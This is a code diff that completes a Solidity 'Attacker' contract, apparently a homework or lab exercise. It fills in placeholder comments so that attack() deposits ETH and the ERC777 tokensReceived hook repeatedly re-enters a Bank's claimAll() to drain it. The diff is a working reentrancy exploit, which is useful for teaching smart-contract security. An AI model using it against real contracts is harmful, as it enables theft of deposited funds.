@@ -1,3 +1,4 @@
+// SPDX-License-Identifier: MIT
 pragma solidity ^0.8.17;
 
 import "@openzeppelin/contracts/access/AccessControl.sol";
@@ -27,7 +28,7 @@ contract Attacker is AccessControl, IERC777Recipient {
 	function setTarget(address bank_address) external onlyRole(ATTACKER_ROLE) {
 		bank = Bank(bank_address);
         _grantRole(ATTACKER_ROLE, address(this));
-        _grantRole(ATTACKER_ROLE, bank.token.address );
+        _grantRole(ATTACKER_ROLE, bank.token().address);
 	}
 
 	/*
@@ -36,7 +37,10 @@ contract Attacker is AccessControl, IERC777Recipient {
 	*/
 	function attack(uint256 amt) payable public {
       require( address(bank) != address(0), "Target bank not set" );
-		//YOUR CODE TO START ATTACK GOES HERE
+	  require(msg.value == amt, "Incorrect ETH sent");
+	  bank.deposit{value: amt}();
+	  emit Deposit(amt);
+	  bank.claimAll();
 	}
 
 	/*
@@ -59,8 +63,12 @@ contract Attacker is AccessControl, IERC777Recipient {
 		bytes calldata userData,
 		bytes calldata operatorData
 	) external {
-		//YOUR CODE TO RECURSE GOES HERE
+		require(msg.sender == address(bank.token()), "Invalid token");
+		if (depth < max_depth) {
+			depth++;
+			emit Recurse(depth);
+			bank.claimAll();
+		}
 	}
 
 }
-
